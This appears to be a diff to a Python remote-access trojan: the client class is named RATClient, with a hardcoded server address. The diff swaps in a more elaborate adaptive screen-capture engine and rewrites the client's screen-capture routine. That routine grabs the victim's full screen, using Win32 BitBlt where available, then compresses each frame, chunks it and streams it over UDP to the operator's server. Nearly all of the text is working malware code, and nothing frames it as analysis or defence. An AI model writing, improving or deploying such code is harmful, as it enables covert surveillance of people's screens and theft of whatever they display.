@@ -44,6 +44,8 @@ from scapy.layers.http import HTTP
 from scapy.layers.dns import DNS
 from scapy.layers.inet import TCP, UDP, ICMP, IP
 from scapy.layers.l2 import ARP
+import collections
+from PIL import Image
 
 # Configuration
 SERVER_IP = "192.168.1.44"  # Change this to the server IP
@@ -2631,76 +2633,322 @@ class NetworkAnalyzer:
         return {'suspicious': False}
     
 
-class AdaptiveScreenCapture:
-    """Handles adaptive quality and performance for screen captures"""
+class EnhancedAdaptiveScreenCapture:
+    """Handles advanced adaptive quality and performance for screen captures"""
     
     def __init__(self, client_socket, initial_quality=70):
         self.client_socket = client_socket
         self.quality = initial_quality
         self.min_quality = 15
         self.max_quality = 95
-        self.target_bitrate = 5000000  # 5 Mbps target
-        self.last_adjustments = []
-        self.performance_history = []
+        
+        # Adaptive bitrate control with multi-level targets
+        self.bitrate_targets = {
+            'low': 2000000,    # 2 Mbps for slow networks
+            'medium': 5000000, # 5 Mbps for average networks
+            'high': 10000000   # 10 Mbps for fast networks
+        }
+        self.current_target = 'medium'
+        self.target_bitrate = self.bitrate_targets[self.current_target]
+        
+        # Enhanced metrics tracking with exponential moving averages
+        self.alpha_short = 0.3  # Short-term trend weight
+        self.alpha_long = 0.05  # Long-term trend weight
+        
+        # Performance metrics with smoothing
+        self.avg_bitrate_short = 0
+        self.avg_bitrate_long = 0
+        self.avg_send_time_short = 0
+        self.avg_send_time_long = 0
+        self.avg_fps = 0
+        
+        # Resolution adaptation
+        self.resolution_scale = 1.0  # Full resolution
+        self.min_scale = 0.5
+        self.max_scale = 1.0
+        
+        # Advanced control parameters
+        self.network_stability = 1.0  # Measure of network stability (1.0 = stable)
+        self.quality_change_threshold = 3  # Minimum quality change to apply
         self.adjustment_cooldown = 0
+        self.cooldown_period = 2  # Wait 2 frames before next adjustment
+        
+        # Performance history with timestamps for time-weighted analysis
+        self.performance_history = collections.deque(maxlen=20)  # Longer history
+        
+        # Network congestion detection
+        self.congestion_indicators = 0  # Counter for consecutive congestion signs
+        self.congestion_threshold = 3  # Threshold for triggering congestion response
+        
+        # Resource monitoring
+        self.cpu_usage_history = collections.deque(maxlen=10)
+        self.start_time = time.time()
+        self.total_bytes_sent = 0
+        self.frame_count = 0
+        
+        # Initialize time-series for advanced prediction
+        self.time_series = {
+            'bitrate': collections.deque(maxlen=30),
+            'send_time': collections.deque(maxlen=30),
+            'quality': collections.deque(maxlen=30),
+            'timestamp': collections.deque(maxlen=30)
+        }
     
     def measure_performance(self, data_size, send_time):
-        """Measure and adjust based on performance metrics"""
-        if send_time > 0:
-            current_bitrate = (data_size * 8) / send_time
-            
-            # Store in history (keep last 5)
-            self.performance_history.append((data_size, send_time, current_bitrate))
-            if len(self.performance_history) > 5:
-                self.performance_history.pop(0)
-            
-            # Only adjust after collecting some data
-            if len(self.performance_history) >= 3:
-                self._adjust_quality(current_bitrate)
-    
-    def _adjust_quality(self, current_bitrate):
-        """Adjust quality based on current performance"""
-        # Skip if on cooldown
-        if self.adjustment_cooldown > 0:
-            self.adjustment_cooldown -= 1
+        """Enhanced performance measurement with predictive analytics"""
+        self.frame_count += 1
+        self.total_bytes_sent += data_size
+        
+        if send_time <= 0:
             return
             
-        # Calculate average metrics
-        avg_bitrate = sum(p[2] for p in self.performance_history) / len(self.performance_history)
-        avg_send_time = sum(p[1] for p in self.performance_history) / len(self.performance_history)
+        # Calculate current metrics
+        current_bitrate = (data_size * 8) / send_time
+        current_timestamp = time.time()
         
-        # Define adjustment parameters
-        bitrate_ratio = avg_bitrate / self.target_bitrate
+        # Update CPU usage history (platform dependent)
+        try:
+            cpu_usage = psutil.cpu_percent(interval=None)
+            self.cpu_usage_history.append(cpu_usage)
+        except:
+            # Fallback if psutil not available
+            self.cpu_usage_history.append(0)
         
-        # Initial adjustment determination
-        quality_adjustment = 0
+        # Store in detailed history for time-series analysis
+        self.performance_history.append({
+            'data_size': data_size,
+            'send_time': send_time,
+            'bitrate': current_bitrate,
+            'quality': self.quality,
+            'timestamp': current_timestamp,
+            'resolution_scale': self.resolution_scale
+        })
         
-        # Bitrate is too high - reduce quality
-        if bitrate_ratio > 1.2:  # More than 20% over target
-            quality_adjustment = -5  # Reduce quality
+        # Update time series for prediction
+        self.time_series['bitrate'].append(current_bitrate)
+        self.time_series['send_time'].append(send_time)
+        self.time_series['quality'].append(self.quality)
+        self.time_series['timestamp'].append(current_timestamp)
+        
+        # Update exponential moving averages
+        if self.avg_bitrate_short == 0:
+            # First measurement
+            self.avg_bitrate_short = current_bitrate
+            self.avg_bitrate_long = current_bitrate
+            self.avg_send_time_short = send_time
+            self.avg_send_time_long = send_time
+        else:
+            # Update with exponential weighting
+            self.avg_bitrate_short = (1 - self.alpha_short) * self.avg_bitrate_short + self.alpha_short * current_bitrate
+            self.avg_bitrate_long = (1 - self.alpha_long) * self.avg_bitrate_long + self.alpha_long * current_bitrate
+            self.avg_send_time_short = (1 - self.alpha_short) * self.avg_send_time_short + self.alpha_short * send_time
+            self.avg_send_time_long = (1 - self.alpha_long) * self.avg_send_time_long + self.alpha_long * send_time
+        
+        # Calculate FPS
+        if len(self.time_series['timestamp']) >= 2:
+            time_diff = self.time_series['timestamp'][-1] - self.time_series['timestamp'][0]
+            if time_diff > 0:
+                current_fps = len(self.time_series['timestamp']) / time_diff
+                if self.avg_fps == 0:
+                    self.avg_fps = current_fps
+                else:
+                    self.avg_fps = 0.8 * self.avg_fps + 0.2 * current_fps
+        
+        # Calculate network stability index
+        if len(self.time_series['bitrate']) >= 5:
+            recent_bitrates = list(self.time_series['bitrate'])[-5:]
+            if max(recent_bitrates) > 0:
+                stability = min(recent_bitrates) / max(recent_bitrates)
+                self.network_stability = 0.7 * self.network_stability + 0.3 * stability
+        
+        # Only adjust after collecting enough data and if not on cooldown
+        if len(self.performance_history) >= 5 and self.adjustment_cooldown <= 0:
+            self._adjust_parameters()
+        else:
+            self.adjustment_cooldown = max(0, self.adjustment_cooldown - 1)
+    
+    def _adjust_parameters(self):
+        """Advanced parameter adjustment using predictive analytics"""
+        # Calculate target performance based on current conditions
+        target_achieved = self._evaluate_target_achievement()
+        network_trend = self._analyze_network_trend()
+        
+        # Determine adjustment strategy
+        if target_achieved == "exceeding" and self.network_stability > 0.8:
+            # Network is stable and performance exceeds targets - try increasing quality
+            self._increase_quality()
+        elif target_achieved == "below" or network_trend == "deteriorating":
+            # Performance below target or network deteriorating
+            self._decrease_quality_or_resolution()
+        elif target_achieved == "on_target" and network_trend == "improving":
+            # On target with improving network - small quality increase
+            self._slight_increase_quality()
+        
+        # Detect and respond to congestion
+        if self._detect_congestion():
+            self._handle_congestion()
+        
+        # Apply cooldown
+        self.adjustment_cooldown = self.cooldown_period
+        
+        # Adapt target bitrate based on sustained performance
+        self._adapt_bitrate_target()
+        
+        # Log current status periodically
+        if self.frame_count % 30 == 0:
+            self._log_status()
+    
+    def _evaluate_target_achievement(self):
+        """Evaluate if we're meeting our target performance"""
+        # Calculate ratio of current performance to target
+        bitrate_ratio = self.avg_bitrate_short / self.target_bitrate
+        
+        if bitrate_ratio > 1.2 and self.avg_send_time_short < 0.05:
+            return "exceeding"
+        elif bitrate_ratio < 0.8 or self.avg_send_time_short > 0.1:
+            return "below"
+        else:
+            return "on_target"
+    
+    def _analyze_network_trend(self):
+        """Analyze recent network performance trend"""
+        if len(self.time_series['bitrate']) < 10:
+            return "stable"
             
-        # Bitrate is too low - increase quality
-        elif bitrate_ratio < 0.8 and avg_send_time < 0.05:  # Less than 80% of target and fast send
-            quality_adjustment = 3  # Increase quality
-            
-        # Check for poor performance (slow sending)
-        if avg_send_time > 0.1:  # Very slow frame sending
-            quality_adjustment = -10  # Significantly reduce quality
+        # Get recent values
+        recent_bitrates = list(self.time_series['bitrate'])[-10:]
+        first_half = sum(recent_bitrates[:5]) / 5
+        second_half = sum(recent_bitrates[5:]) / 5
         
-        # Apply adjustment if needed
-        if quality_adjustment != 0:
-            new_quality = max(self.min_quality, 
-                             min(self.max_quality, self.quality + quality_adjustment))
-            
-            # Only actually change if significant
-            if abs(new_quality - self.quality) >= 3:
-                self.quality = new_quality
-                self.adjustment_cooldown = 3  # Wait 3 frames before next adjustment
+        # Calculate trend direction and magnitude
+        if second_half < 0.8 * first_half:
+            return "deteriorating"
+        elif second_half > 1.2 * first_half:
+            return "improving"
+        else:
+            return "stable"
+    
+    def _increase_quality(self):
+        """Intelligently increase quality"""
+        # Determine appropriate increment based on stability
+        increment = max(2, int(5 * self.network_stability))
+        
+        # If we're capping at max quality, try increasing resolution instead
+        if self.quality >= self.max_quality - 5:
+            if self.resolution_scale < self.max_scale:
+                self.resolution_scale = min(self.max_scale, self.resolution_scale + 0.1)
+                return
                 
-                # Store adjustment for history
-                self.last_adjustments.append((self.quality, avg_bitrate, avg_send_time))
-                if len(self.last_adjustments) > 10:
-                    self.last_adjustments.pop(0)
+        # Otherwise increase quality
+        new_quality = min(self.max_quality, self.quality + increment)
+        
+        # Only apply if the change is significant
+        if new_quality - self.quality >= self.quality_change_threshold:
+            self.quality = new_quality
+    
+    def _decrease_quality_or_resolution(self):
+        """Intelligently decrease quality or resolution based on conditions"""
+        # Check send time to determine severity
+        if self.avg_send_time_short > 0.2:
+            # Severe performance issue - aggressive adjustment
+            if self.resolution_scale > self.min_scale:
+                # Reduce resolution first in severe cases
+                self.resolution_scale = max(self.min_scale, self.resolution_scale - 0.1)
+            else:
+                # Then reduce quality significantly
+                self.quality = max(self.min_quality, self.quality - 10)
+        else:
+            # Moderate performance issue - gentle adjustment
+            self.quality = max(self.min_quality, self.quality - 5)
+    
+    def _slight_increase_quality(self):
+        """Make a small improvement to quality"""
+        new_quality = min(self.max_quality, self.quality + 2)
+        if new_quality - self.quality >= self.quality_change_threshold:
+            self.quality = new_quality
+    
+    def _detect_congestion(self):
+        """Detect network congestion using multiple indicators"""
+        if len(self.time_series['send_time']) < 5:
+            return False
+            
+        # Get recent values
+        recent_send_times = list(self.time_series['send_time'])[-5:]
+        
+        # Check for increasing trend in send times
+        increasing_trend = all(recent_send_times[i] < recent_send_times[i+1] for i in range(len(recent_send_times)-1))
+        
+        # Check for high variance
+        avg_time = sum(recent_send_times) / len(recent_send_times)
+        variance = sum((t - avg_time) ** 2 for t in recent_send_times) / len(recent_send_times)
+        high_variance = variance > (avg_time * 0.3) ** 2
+        
+        # Detect congestion signs
+        congestion_detected = (increasing_trend and recent_send_times[-1] > 1.5 * recent_send_times[0]) or high_variance
+        
+        if congestion_detected:
+            self.congestion_indicators += 1
+        else:
+            self.congestion_indicators = max(0, self.congestion_indicators - 1)
+        
+        return self.congestion_indicators >= self.congestion_threshold
+    
+    def _handle_congestion(self):
+        """Handle detected network congestion"""
+        # Immediate quality reduction
+        self.quality = max(self.min_quality, self.quality - 15)
+        
+        # Reduce resolution if quality is already low
+        if self.quality < 30 and self.resolution_scale > self.min_scale:
+            self.resolution_scale = max(self.min_scale, self.resolution_scale - 0.2)
+        
+        # Switch to lower bitrate target
+        self.current_target = 'low'
+        self.target_bitrate = self.bitrate_targets[self.current_target]
+        
+        # Reset congestion counter
+        self.congestion_indicators = 0
+        
+        # Extended cooldown after congestion
+        self.adjustment_cooldown = self.cooldown_period * 2
+    
+    def _adapt_bitrate_target(self):
+        """Dynamically adapt bitrate target based on sustained performance"""
+        # Only adapt after substantial history
+        if len(self.performance_history) < 15:
+            return
+            
+        # Calculate average sustained bitrate
+        sustained_bitrate = self.avg_bitrate_long
+        
+        # Adjust target category based on sustained performance
+        if self.current_target == 'low' and sustained_bitrate > self.bitrate_targets['low'] * 1.5:
+            self.current_target = 'medium'
+            self.target_bitrate = self.bitrate_targets['medium']
+        elif self.current_target == 'medium':
+            if sustained_bitrate > self.bitrate_targets['medium'] * 1.5:
+                self.current_target = 'high'
+                self.target_bitrate = self.bitrate_targets['high']
+            elif sustained_bitrate < self.bitrate_targets['low'] * 0.8:
+                self.current_target = 'low'
+                self.target_bitrate = self.bitrate_targets['low']
+        elif self.current_target == 'high' and sustained_bitrate < self.bitrate_targets['medium'] * 0.8:
+            self.current_target = 'medium'
+            self.target_bitrate = self.bitrate_targets['medium']
+    
+    def _log_status(self):
+        """Log detailed status information"""
+        # Calculate overall statistics
+        elapsed_time = time.time() - self.start_time
+        avg_bitrate = (self.total_bytes_sent * 8) / elapsed_time if elapsed_time > 0 else 0
+        
+        status = f"Quality: {self.quality}, Scale: {self.resolution_scale:.2f}, "
+        status += f"Target: {self.current_target} ({self.target_bitrate/1000000:.1f}Mbps), "
+        status += f"Avg: {self.avg_bitrate_short/1000000:.2f}Mbps, "
+        status += f"FPS: {self.avg_fps:.1f}, "
+        status += f"Stability: {self.network_stability:.2f}"
+        
+        print(f"[*] Metrics: {status}")
 
 class RATClient:
     def __init__(self, server_ip=SERVER_IP, server_port=SERVER_PORT):
@@ -3001,101 +3249,287 @@ class RATClient:
             self.client_socket.send(error_msg.encode())
     
     def screen_capture(self):
-        """Capture screen and send to server via UDP with reliable chunking and flow control"""
-        print("[*] Starting screen capture")
+        """Capture screen and send to server via UDP with optimized performance"""
+        print("[*] Starting screen capture with enhanced performance")
         try:
+            # Import required libraries
+            import socket
+            import struct
+            import time
+            import zlib
+            import threading
+            from PIL import ImageGrab
+            import numpy as np
+            import cv2
+            
             # Create UDP socket for sending screenshots
             udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             
-            # Set socket buffer size
-            udp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8388608)  # 8MB buffer
+            # Set socket buffer size with more conservative value
+            send_buffer_size = 4194304  # 4MB buffer
+            udp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, send_buffer_size)
+            
+            # Set socket options for better performance
+            udp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            
+            # Try to set QoS (Type of Service) for real-time data
+            try:
+                # IPTOS_LOWDELAY (0x10) - minimize delay
+                udp_socket.setsockopt(socket.IPPROTO_IP, socket.IP_TOS, 0x10)
+            except (AttributeError, OSError):
+                # Skip if not supported on this platform
+                pass
             
             # Define constants for transmission
-            MAX_CHUNK_SIZE = 4096  # Conservative chunk size to avoid fragmentation
-            PROTOCOL_OVERHEAD = 36  # Typical UDP/IP header overhead
-            EFFECTIVE_MTU = 1472  # 1500 (Ethernet MTU) - PROTOCOL_OVERHEAD
+            MAX_CHUNK_SIZE = 1200  # Conservative chunk size to avoid fragmentation
             
-            # Ensure chunk size is within effective MTU
-            CHUNK_SIZE = min(MAX_CHUNK_SIZE, EFFECTIVE_MTU)
-            
-            # Create the adaptive capture handler
-            adaptive_capture = AdaptiveScreenCapture(self.client_socket)
+            # Create the enhanced adaptive capture handler
+            adaptive_capture = EnhancedAdaptiveScreenCapture(self.client_socket)
             
             # Initialize sequence tracking
             frame_number = 0
+            last_fps_calc_time = time.time()
+            frames_since_last_calc = 0
+            current_fps = 0
             
-            while self.screen_capture_active and self.connected and not self.stop_threads:
+            # Buffer pool for reuse to reduce memory pressure
+            compress_buffer_pool = []
+            MAX_COMPRESS_BUFFER_POOL = 3
+            
+            # Direct pixel access for faster screen capture when possible
+            direct_capture_available = False
+            try:
+                # Try to import platform-specific faster capture libraries
+                if sys.platform.startswith('win'):
+                    try:
+                        import win32gui
+                        import win32ui
+                        import win32con
+                        import win32api
+                        direct_capture_available = True
+                    except ImportError:
+                        pass
+            except:
+                pass
+                
+            # Thread synchronization for non-blocking network operations
+            network_backlog = 0
+            backlog_lock = threading.Lock()
+            
+            def send_frame_chunks(compressed_data, current_frame_number, client_resolution_scale):
+                """Send frame chunks in a separate thread to avoid blocking"""
+                nonlocal network_backlog
+                
+                start_send_time = time.time()
+                
                 try:
-                    start_time = time.time()
-                    
-                    # Capture screenshot using PIL
-                    screenshot = ImageGrab.grab()
-                    
-                    # Convert to bytes using OpenCV
-                    screenshot_np = np.array(screenshot)
-                    frame = cv2.cvtColor(screenshot_np, cv2.COLOR_RGB2BGR)
-                    
-                    # Determine quality based on adaptive system
-                    current_quality = adaptive_capture.quality
-                    
-                    # Encode and compress the image
-                    _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, current_quality])
-                    compressed_data = zlib.compress(buffer)
-                    
                     # Calculate number of chunks needed
                     data_len = len(compressed_data)
-                    num_chunks = (data_len + CHUNK_SIZE - 1) // CHUNK_SIZE
+                    num_chunks = (data_len + MAX_CHUNK_SIZE - 1) // MAX_CHUNK_SIZE
                     
                     # Send frame metadata
-                    frame_number += 1
-                    metadata = struct.pack('!QII', data_len, num_chunks, frame_number)
+                    metadata = struct.pack('!QII', data_len, num_chunks, current_frame_number)
                     udp_socket.sendto(metadata, self.server_address)
                     
                     # Small delay to ensure metadata is processed first
-                    time.sleep(0.002)
+                    time.sleep(0.001)
                     
                     # Send chunks with sequence numbers for reassembly
                     for i in range(num_chunks):
-                        chunk_start = i * CHUNK_SIZE
-                        chunk_end = min(chunk_start + CHUNK_SIZE, data_len)
+                        chunk_start = i * MAX_CHUNK_SIZE
+                        chunk_end = min(chunk_start + MAX_CHUNK_SIZE, data_len)
                         chunk = compressed_data[chunk_start:chunk_end]
                         
                         # Pack chunk with header (frame_number, chunk_index, total_chunks)
-                        header = struct.pack('!III', frame_number, i, num_chunks)
+                        header = struct.pack('!III', current_frame_number, i, num_chunks)
                         packet = header + chunk
                         
                         # Send the chunk
                         udp_socket.sendto(packet, self.server_address)
                         
-                        # Brief pause between chunks to prevent network congestion
-                        if i % 10 == 0 and i > 0:  # Every 10 chunks
-                            time.sleep(0.001)  # 1ms pause to allow processing
+                        # Brief pause between chunks based on backlog
+                        with backlog_lock:
+                            current_backlog = network_backlog
+                        
+                        # Adjust sending rate based on backlog
+                        if current_backlog > 5:
+                            chunk_delay = 0.002  # 2ms between chunks
+                        elif current_backlog > 2:
+                            chunk_delay = 0.001  # 1ms between chunks
+                        else:
+                            chunk_delay = 0  # No delay when network is clear
+                            
+                        if chunk_delay > 0 and i % 5 == 0 and i > 0:
+                            time.sleep(chunk_delay)
                     
                     # Calculate total send time
-                    send_time = time.time() - start_time
+                    send_time = time.time() - start_send_time
+                    
+                    # Update network backlog
+                    with backlog_lock:
+                        network_backlog = max(0, network_backlog - 1)
+                    
+                    # Return the buffer to the pool if possible
+                    if len(compress_buffer_pool) < MAX_COMPRESS_BUFFER_POOL:
+                        compress_buffer_pool.append(compressed_data)
                     
                     # Update adaptive system with performance metrics
                     adaptive_capture.measure_performance(data_len, send_time)
                     
-                    # Dynamic sleep based on performance and quality
-                    if send_time < 0.03:  # Very fast sending
-                        sleep_time = max(0.01, (1/30) - send_time)  # Target ~30fps but minimum 10ms
-                    else:
-                        # Calculate based on quality and network conditions
-                        fps_target = max(5, 30 - (current_quality / 5))  # Lower quality = higher FPS
-                        sleep_time = max(0, (1/fps_target) - send_time)
+                except Exception as e:
+                    print(f"[!] Error sending frame chunks: {e}")
+                    with backlog_lock:
+                        network_backlog = max(0, network_backlog - 1)
+            
+            # Function for faster screen capture on Windows
+            def fast_windows_capture():
+                try:
+                    # Get screen dimensions
+                    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
+                    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
+                    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
+                    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
                     
-                    time.sleep(sleep_time)
+                    # Create device context
+                    hdc = win32gui.GetDC(0)
+                    dc_obj = win32ui.CreateDCFromHandle(hdc)
+                    compatible_dc = dc_obj.CreateCompatibleDC()
+                    
+                    # Create bitmap object
+                    bitmap = win32ui.CreateBitmap()
+                    bitmap.CreateCompatibleBitmap(dc_obj, width, height)
+                    compatible_dc.SelectObject(bitmap)
+                    
+                    # Copy screen into bitmap
+                    compatible_dc.BitBlt((0, 0), (width, height), dc_obj, (left, top), win32con.SRCCOPY)
+                    
+                    # Convert bitmap to PIL Image
+                    bitmap_info = bitmap.GetInfo()
+                    bitmap_bits = bitmap.GetBitmapBits(True)
+                    img = Image.frombuffer('RGB', (bitmap_info['bmWidth'], bitmap_info['bmHeight']), bitmap_bits, 'raw', 'BGRX', 0, 1)
+                    
+                    # Clean up
+                    win32gui.ReleaseDC(0, hdc)
+                    dc_obj.DeleteDC()
+                    compatible_dc.DeleteDC()
+                    win32gui.DeleteObject(bitmap.GetHandle())
+                    
+                    return img
+                except Exception as e:
+                    print(f"[!] Fast screen capture failed: {e}")
+                    return None
+            
+            # Main capture loop
+            while self.screen_capture_active and self.connected and not self.stop_threads:
+                try:
+                    start_time = time.time()
+                    
+                    # Get current adaptive parameters
+                    current_quality = adaptive_capture.quality
+                    current_scale = adaptive_capture.resolution_scale
+                    
+                    # Choose capture method based on availability
+                    if direct_capture_available:
+                        # Try fast capture method first
+                        screenshot = fast_windows_capture()
+                        # Fall back to standard method if fast capture fails
+                        if screenshot is None:
+                            screenshot = ImageGrab.grab()
+                    else:
+                        # Standard capture method
+                        screenshot = ImageGrab.grab()
+                    
+                    # Apply resolution scaling if needed
+                    if current_scale < 1.0:
+                        orig_width, orig_height = screenshot.size
+                        new_width = max(64, int(orig_width * current_scale))
+                        new_height = max(64, int(orig_height * current_scale))
+                        screenshot = screenshot.resize((new_width, new_height), Image.LANCZOS)
+                    
+                    # Convert to numpy array using optimized path
+                    screenshot_np = np.array(screenshot)
+                    frame = cv2.cvtColor(screenshot_np, cv2.COLOR_RGB2BGR)
+                    
+                    # Encode with current quality
+                    encode_params = [cv2.IMWRITE_JPEG_QUALITY, current_quality]
+                    _, buffer = cv2.imencode('.jpg', frame, encode_params)
+                    
+                    # Check network backlog before compressing
+                    with backlog_lock:
+                        current_backlog = network_backlog
+                    
+                    # Skip frames if network is congested
+                    if current_backlog > 10:
+                        print(f"[!] Network congestion detected, skipping frame {frame_number}")
+                        time.sleep(0.05)  # Brief pause to allow network to catch up
+                        continue
+                    
+                    # Compress the data
+                    if compress_buffer_pool:
+                        # Reuse buffer from pool
+                        compressed_data = compress_buffer_pool.pop()
+                        # Reset buffer and overwrite with new compressed data
+                        compressed_data = zlib.compress(buffer, level=1)  # Use fast compression
+                    else:
+                        # Create new buffer
+                        compressed_data = zlib.compress(buffer, level=1)
+                    
+                    # Increment frame number
+                    frame_number += 1
+                    
+                    # Update network backlog
+                    with backlog_lock:
+                        network_backlog += 1
+                    
+                    # Send chunks in a separate thread to avoid blocking the capture loop
+                    threading.Thread(
+                        target=send_frame_chunks,
+                        args=(compressed_data, frame_number, current_scale)
+                    ).start()
+                    
+                    # Calculate frame processing time (excluding network)
+                    process_time = time.time() - start_time
+                    
+                    # Calculate current FPS
+                    frames_since_last_calc += 1
+                    fps_calc_elapsed = time.time() - last_fps_calc_time
+                    
+                    if fps_calc_elapsed >= 1.0:  # Update FPS once per second
+                        current_fps = frames_since_last_calc / fps_calc_elapsed
+                        last_fps_calc_time = time.time()
+                        frames_since_last_calc = 0
+                    
+                    # Dynamic sleep based on target FPS and processing time
+                    # Calculate target FPS based on network conditions and quality
+                    if current_quality > 80:
+                        target_fps = 20  # High quality = lower FPS
+                    elif current_quality > 50:
+                        target_fps = 25  # Medium quality
+                    else:
+                        target_fps = 30  # Low quality = higher FPS
+                    
+                    # Adjust target FPS based on network backlog
+                    target_fps = max(5, target_fps - current_backlog)
+                    
+                    # Calculate and apply sleep time
+                    if target_fps > 0:
+                        target_frame_time = 1.0 / target_fps
+                        sleep_time = max(0.001, target_frame_time - process_time)
+                        time.sleep(sleep_time)
+                    else:
+                        time.sleep(0.05)  # Fallback sleep
                     
                     # Print diagnostics occasionally
                     if frame_number % 30 == 0:
-                        print(f"[*] Frame {frame_number}: {data_len} bytes, {num_chunks} chunks, " 
-                            f"send time: {send_time:.3f}s, quality: {current_quality}, "
-                            f"sleep: {sleep_time:.3f}s")
+                        elapsed = time.time() - start_time
+                        print(f"[*] Frame {frame_number}: {len(compressed_data)} bytes, "
+                            f"process: {process_time*1000:.1f}ms, "
+                            f"quality: {current_quality}, scale: {current_scale:.2f}, "
+                            f"FPS: {current_fps:.1f}, backlog: {current_backlog}")
                     
                 except Exception as e:
                     print(f"[!] Error during screen capture: {e}")
-                    time.sleep(1)  # Wait before retry
+                    time.sleep(0.5)  # Shorter wait before retry
             
             # Send termination signal when done
             try:
